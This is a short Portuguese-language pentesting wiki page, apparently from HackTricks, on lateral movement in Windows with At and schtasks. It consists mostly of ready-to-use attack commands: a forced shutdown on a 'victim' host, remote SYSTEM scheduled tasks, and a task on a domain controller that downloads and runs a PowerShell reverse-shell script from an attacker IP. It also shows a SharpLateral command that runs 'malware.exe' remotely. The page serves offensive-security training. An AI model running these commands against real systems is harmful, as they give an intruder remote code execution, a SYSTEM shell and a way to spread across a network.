# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Como Funciona

At permite agendar tarefas em hosts onde você conhece o nome de usuário/(senha/Hash). Assim, você pode usá-lo para executar comandos em outros hosts e obter a saída.
```
At \\victim 11:00:00PM shutdown -r
```
Usando schtasks, você precisa primeiro criar a tarefa e depois chamá-la:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Você também pode usar [SharpLateral](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Mais informações sobre o [**uso de schtasks com silver tickets aqui**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
